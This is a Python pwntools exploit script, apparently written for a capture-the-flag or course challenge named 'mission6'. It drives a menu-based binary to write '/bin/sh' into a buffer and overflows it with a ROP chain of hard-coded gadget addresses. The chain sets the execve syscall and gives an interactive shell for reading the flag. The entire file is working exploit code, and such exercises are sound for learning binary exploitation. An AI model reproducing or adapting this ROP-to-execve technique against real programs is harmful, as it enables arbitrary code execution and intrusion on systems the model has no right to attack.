from pwn import *

def send_val(p, idd, val, bytess=False):
	log.info("Fist choice")
	log.info(p.recvuntil(b" > "))
	## Choice
	p.send(b"1")

	log.info(p.recvuntil(b"ID"))
	## Id
	if (not bytess):
	        p.send(idd)
	else:
	        p.send(str(struct.unpack("<Q", idd)[0]))
	endiannes = p.recvuntil(b"endian: ", timeout=1)
	if (b'Little' in endiannes):
	        binsh = str(struct.unpack("<Q", val)[0])
	elif (b'Big' in endiannes):
	        log.info("BIG ENDIAN")
	        binsh = str(struct.unpack(">Q", val)[0])
	else:
	        print(idd, "Unexpected prompt:", endiannes.decode())
	        exit(1)

	## Value with binsh
	p.send(binsh)


"""
1) Write '//bin/sh' in the buffer
2) Create the present gadget with an execve
3) Overflow --> BUFFDIM = 2

0x0000000000479136 : pop rax ; pop rdx ; pop rbx ; ret
"""
execve = 59

context.binary = binary = ELF("/home/m259542/mission6/mission6", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

if (True ):
	p = process(env={"PWD":"/home/m259542/mission6/", "SHLVL":"0"})
else:
	p = gdb.debug("/home/m259542/mission6/writable/mission6",'''
	unset environment
	break *0x000000000040114f
	''', env={"PWD":"/home/m259542/mission6/", "SHLVL":"0"})

rdi = b'\x00\x00\x7f\xff\xff\xff\xec\xb0'[::-1] # ptr to /bin/sh\0
rsi = p64(0) # ptr argv
rdx = p64(0) # ptr envp

# 1) Set up the ROP syscall
gift_addr = b"\x00\x00\x7f\xff\xf7\xff\xa0\x00"[::-1] # get_present() gift

# 2) Set up the /bin/sh string in the buffer
send_val(p, b'9', b'\x2f\x62\x69\x6e\x2f\x73\x68\x00')

# 3) Fill up some space
send_val(p, b'10', b'\x2f\x62\x69\x6e\x2f\x73\x68\x00')

# 4) Setting up the RSP
log.info("Injecting address")

gadget_addr1 = b"\x00\x00\x00\x00\x00\x47\x91\x38"[::-1]
gadget_addr2 = b"\x00\x00\x00\x00\x00\x47\x91\x36"[::-1]
send_val(p, b'11', gadget_addr1)
send_val(p, gadget_addr2, b"\x00\x00\x00\x00\x00\x00\x00\x3b"[::-1], True) # jump to gadget2, RAX -> execve
send_val(p, b"13", gift_addr)
send_val(p, b"0", rdi)

log.info(p.recvuntil(b" > "))
p.send(b"4")
log.info(p.recvuntil(b"Bye!\n"))
log.info("Exploit done")
log.info(p.recvuntil(b"\n\n", timeout=3))
log.info("Sending cat flag")
p.interactive()
print("---> " + p.recvall())